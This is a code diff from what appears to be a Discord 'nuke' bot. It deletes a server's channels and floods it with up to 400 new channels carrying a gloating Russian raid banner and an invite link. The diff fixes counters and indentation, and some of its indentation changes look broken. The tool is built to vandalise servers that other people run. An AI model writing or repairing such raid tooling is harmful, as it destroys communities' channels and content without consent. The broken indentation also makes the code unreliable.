@@ -53,7 +53,7 @@ async def nuke(ctx):
             elif result is False:
                 skipped += 1
     
-    async def delete_single_channel(channel):
+        async def delete_single_channel(channel):
         try:
             await channel.delete()
             return True
@@ -91,13 +91,16 @@ https://discord.gg/3B3yEVwGb5
 ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
 """
     
+        # ===== ЭТО ПЕРЕМЕННЫЕ (ОНИ ДОЛЖНЫ БЫТЬ ЗДЕСЬ) =====
     created = 0
     failed = 0
+    rate_limit_hits = 0
     target_channels = 400
+    # ================================================
     
     # Создаем пачками по 6 каналов
     async def create_channel_batch(batch_num):
-        nonlocal created, failed, rate_limit_hits
+        nonlocal created, failed, rate_limit_hits  # ← ЭТО ОСТАВЛЯЕМ
         tasks = []
         
         for j in range(6):  # 6 каналов в пачке
